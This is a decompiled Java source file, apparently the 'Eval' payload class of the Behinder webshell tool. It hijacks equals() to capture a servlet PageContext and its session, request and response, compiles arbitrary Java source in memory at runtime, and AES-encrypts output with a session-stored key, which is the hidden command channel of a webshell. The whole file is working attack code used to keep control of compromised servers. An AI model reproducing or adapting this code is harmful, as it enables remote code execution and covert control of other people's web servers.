//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.io.IOException;
import java.io.Writer;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import javax.tools.DiagnosticCollector;
import javax.tools.DiagnosticListener;
import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;
import javax.tools.JavaCompiler.CompilationTask;
import net.rebeyond.behinder.utils.Utils.MyJavaFileObject;

public class Eval {
    public static String sourceCode;
    private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public Eval() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        return true;
    }

    public void javaCompile(String fileName) throws IOException {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        StandardJavaFileManager fileManager = compiler.getStandardFileManager((DiagnosticListener)null, (Locale)null, (Charset)null);
        Iterable<? extends JavaFileObject> compilationUnits = fileManager.getJavaFileObjectsFromStrings(Arrays.asList(fileName));
        CompilationTask task = compiler.getTask((Writer)null, fileManager, (DiagnosticListener)null, (Iterable)null, (Iterable)null, compilationUnits);
        boolean success = task.call();
        fileManager.close();
    }

    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
        byte[] classBytes = null;
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        if (compiler == null) {
            throw new Exception("本地机器上没有找到编译环境，请确认:1.是否安装了JDK环境;2." + System.getProperty("java.home") + File.separator + "lib目录下是否有tools.jar.");
        } else {
            DiagnosticCollector<JavaFileObject> collector = new DiagnosticCollector();
            StandardJavaFileManager standardJavaFileManager = compiler.getStandardFileManager(collector, (Locale)null, (Charset)null);
            List<String> options = new ArrayList();
            Pattern CLASS_PATTERN = Pattern.compile("class\\s+([$_a-zA-Z][$_a-zA-Z0-9]*)\\s*");
            Matcher matcher = CLASS_PATTERN.matcher(sourceCode);
            if (matcher.find()) {
                String cls = matcher.group(1);
                MyJavaFileObject javaFileObject = new MyJavaFileObject(cls, sourceCode);
                Boolean var11 = compiler.getTask((Writer)null, standardJavaFileManager, collector, options, (Iterable)null, Arrays.asList(javaFileObject)).call();
                byte[] var12 = new byte[0];
                JavaFileObject fileObject = (JavaFileObject)fileObjects.get(cls);
                if (fileObject != null) {
                    classBytes = ((MyJavaFileObject)fileObject).getCompiledBytes();
                }

                return classBytes;
            } else {
                throw new IllegalArgumentException("No such class name in " + sourceCode);
            }
        }
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        Iterator var6 = entity.keySet().iterator();

        while(var6.hasNext()) {
            String key = (String)var6.next();
            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
}
